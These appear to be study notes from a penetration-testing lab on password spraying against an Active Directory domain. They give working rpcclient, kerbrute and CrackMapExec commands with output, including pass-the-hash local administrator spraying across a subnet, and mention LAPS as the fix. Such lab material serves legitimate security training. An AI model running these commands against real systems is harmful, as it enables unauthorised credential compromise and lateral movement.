we created username wordlist using methods in previous section and now we practice password spraying from `linux` and `window` host.

#### Using RpcClient
Best option for password spraying is `rpcclient` for `Linux`. we can use bash on liner command  [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) to execute this attack. 

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

#### Using Kerbrute for the Attack
we can also use `kerbrute` for this attack.
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

#### Using CrackMapExec
Another option is you can use `CrackMapExec` best tool that accept text file of usernames to run against single password in spraying attack. 
Grep for `+` to filter out logon failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

After getting password we can validate using `CrackMapExec` quickly against `Domain Controller`. 
#### Validating Using CrackMapExec
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Local Administrator Password Reuse
`Internal Password spraying` is not only possible by `DC` account. if you got administrative access and `NTLM` password hashes or clear text for local administrator or any other local account you can try this against other hosts. because this `pass` use multiple time due to gold images or automate deployment across multiple hosts.

`CrackMapExec` is best for this and target high services like `SQL` or `Microsoft Exchange`.

some time we may only retrieve `NTLM` hash for the local administrator account from local `SAM` database and spray the hash across entire `subnet` to hunt local administrator account with same password. we can use  `--local-auth` attempt to login one machine at a time and remove the threat of account `lockout`.
#### Local Admin Spraying with CrackMapExec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

This technique is not good for assessment that require `stealth` and quite `noisy`. To remove this issue use the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) that enforce unique password. 

`Password spraying` isn’t only an internal attack.  Attackers also use it from the internet to break into companies. it can lead to web portal access, emails and remote access system.